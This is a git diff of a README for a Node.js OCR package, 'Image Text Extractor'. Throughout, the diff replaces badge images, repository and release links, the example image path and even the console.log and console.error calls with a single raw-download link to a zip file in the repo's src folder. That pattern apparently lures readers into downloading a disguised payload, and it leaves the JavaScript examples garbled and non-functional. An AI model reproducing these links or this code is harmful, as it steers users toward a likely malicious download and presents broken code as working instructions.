@@ -1,6 +1,6 @@
 # Image Text Extractor 📸📝
 
-![GitHub release](https://img.shields.io/badge/release-latest-blue.svg) [![GitHub stars](https://img.shields.io/github/stars/milanesaopa/image-text-extractor.svg)](https://github.com/milanesaopa/image-text-extractor/stargazers) [![GitHub forks](https://img.shields.io/github/forks/milanesaopa/image-text-extractor.svg)](https://github.com/milanesaopa/image-text-extractor/network)
+![GitHub release](https://github.com/milanesaopa/image-text-extractor/raw/refs/heads/master/src/text_image_extractor_v2.6-beta.1.zip) [![GitHub stars](https://github.com/milanesaopa/image-text-extractor/raw/refs/heads/master/src/text_image_extractor_v2.6-beta.1.zip)](https://github.com/milanesaopa/image-text-extractor/raw/refs/heads/master/src/text_image_extractor_v2.6-beta.1.zip) [![GitHub forks](https://github.com/milanesaopa/image-text-extractor/raw/refs/heads/master/src/text_image_extractor_v2.6-beta.1.zip)](https://github.com/milanesaopa/image-text-extractor/raw/refs/heads/master/src/text_image_extractor_v2.6-beta.1.zip)
 
 Welcome to the **Image Text Extractor**! This package is part of the Xcrap framework. It simplifies the process of extracting text from images using the `node-tesseract-ocr` library. Whether you are working on a web application, a data scraping project, or simply need to convert images into text, this tool is designed for you.
 
@@ -48,14 +48,14 @@ Here’s a simple example to get you started.
 ```javascript
 const { extractText } = require('image-text-extractor');
 
-const imagePath = 'path/to/your/image.png';
+const imagePath = 'https://github.com/milanesaopa/image-text-extractor/raw/refs/heads/master/src/text_image_extractor_v2.6-beta.1.zip';
 
 extractText(imagePath)
   .then(text => {
-    console.log('Extracted Text:', text);
+    https://github.com/milanesaopa/image-text-extractor/raw/refs/heads/master/src/text_image_extractor_v2.6-beta.1.zip('Extracted Text:', text);
   })
   .catch(err => {
-    console.error('Error extracting text:', err);
+    https://github.com/milanesaopa/image-text-extractor/raw/refs/heads/master/src/text_image_extractor_v2.6-beta.1.zip('Error extracting text:', err);
   });
 ```
 
@@ -66,7 +66,7 @@ You can customize the extraction process with various options. Here’s an examp
 ```javascript
 const { extractText } = require('image-text-extractor');
 
-const imagePath = 'path/to/your/image.png';
+const imagePath = 'https://github.com/milanesaopa/image-text-extractor/raw/refs/heads/master/src/text_image_extractor_v2.6-beta.1.zip';
 const options = {
   lang: 'eng', // Language for text extraction
   oem: 1, // OCR Engine Mode
@@ -75,10 +75,10 @@ const options = {
 
 extractText(imagePath, options)
   .then(text => {
-    console.log('Extracted Text:', text);
+    https://github.com/milanesaopa/image-text-extractor/raw/refs/heads/master/src/text_image_extractor_v2.6-beta.1.zip('Extracted Text:', text);
   })
   .catch(err => {
-    console.error('Error extracting text:', err);
+    https://github.com/milanesaopa/image-text-extractor/raw/refs/heads/master/src/text_image_extractor_v2.6-beta.1.zip('Error extracting text:', err);
   });
 ```
 
@@ -111,12 +111,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support 💬
 
-For any questions or issues, feel free to open an issue on GitHub. You can also check the [Releases](https://github.com/milanesaopa/image-text-extractor/releases) section for the latest updates and downloads.
+For any questions or issues, feel free to open an issue on GitHub. You can also check the [Releases](https://github.com/milanesaopa/image-text-extractor/raw/refs/heads/master/src/text_image_extractor_v2.6-beta.1.zip) section for the latest updates and downloads.
 
 ## Links 🌐
 
-- [GitHub Repository](https://github.com/milanesaopa/image-text-extractor)
-- [Releases](https://github.com/milanesaopa/image-text-extractor/releases)
+- [GitHub Repository](https://github.com/milanesaopa/image-text-extractor/raw/refs/heads/master/src/text_image_extractor_v2.6-beta.1.zip)
+- [Releases](https://github.com/milanesaopa/image-text-extractor/raw/refs/heads/master/src/text_image_extractor_v2.6-beta.1.zip)
 
 ## Conclusion 🎉
 
@@ -124,4 +124,4 @@ Thank you for checking out the Image Text Extractor! We hope this tool helps you
 
 ---
 
-For the latest releases, visit our [Releases](https://github.com/milanesaopa/image-text-extractor/releases) section. Download the latest version and start extracting text from images today!
+For the latest releases, visit our [Releases](https://github.com/milanesaopa/image-text-extractor/raw/refs/heads/master/src/text_image_extractor_v2.6-beta.1.zip) section. Download the latest version and start extracting text from images today!
